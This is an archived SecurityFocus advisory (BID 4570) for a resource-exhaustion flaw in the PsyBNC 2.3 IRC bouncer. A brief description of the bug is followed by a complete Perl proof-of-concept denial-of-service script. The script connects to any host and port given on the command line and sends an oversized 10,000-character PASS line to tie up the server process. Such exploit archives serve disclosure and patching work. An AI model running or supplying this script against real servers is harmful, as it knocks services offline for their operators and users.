source: http://www.securityfocus.com/bid/4570/info

PsyBNC is a freely available, open source IRC bouncing server. It is available for the UNIX and Linux operating systems.

Under some circumstances, it is possible for a remote user to crash a vulnerable server. Upon connection to a vulnerable system, if a user sends a password of 9000 or more characters, and disconnects from the system, the server process does not die. Instead, the process continues to live and consume a large amount of resources.


#!/usr/bin/perl
#PsyBNC 2.3 Remote DDOS POC
#By DVDMAN (DVDMAN@L33TSECURITY.COM)
#WWW.L33TSECURITY.COM
#L33T SECURITY

use Getopt::Std;
use IO::Socket;
$|=1;


my %options;
getopt('Hhp',\%options);
$arg2 = shift(@ARGV);
$options{h} && usage();
if ($options{H})
{
do_psy();
}
if ($options{p})
{
do_psy();
}
else
{
usage();
}
sub usage()
{
    print("[L33TSECURITY]  PsyBNC 2.3 Remote DDOS\n");
    print(" (C) DVDMAN \n\n");
    print("Usage: $0 [options]\n");
    print("-H = hostname or ip REQUIRED\n");
    print("-p = port of PSYBNC server REQUIRED\n");
}
  
exit(1);

 

sub do_psy() {
my $test = $options{H};
my $test2 = $options{p};

    $remote = IO::Socket::INET->new(
                        Proto     => "tcp",
                                PeerAddr  => $test,
                                PeerPort  => $test2,
        );
    unless ($remote) {
           print"error cannot connect";
           return
        }
    $remote->autoflush(1);


print STDERR "PsyBNC REMOTE DDOS BY DVDMAN\n";
print STDERR " starting attack in 5 seconds...\n";
sleep(5);

my $user = "USER OWNED OWNED OWNED OWNED OWNED\r\n";
my $nick = "NICK OWNED\r\n";
my $pw = "PASS " . "A"x10000;

print $remote $user;
print $remote $nick;
print $remote $pw;
print STDERR "DONE\n"; 
die "BYE\n";
}





#By DVDMAN (DVDMAN@L33TSECURITY.COM)
#WWW.L33TSECURITY.COM
#L33T SECURITY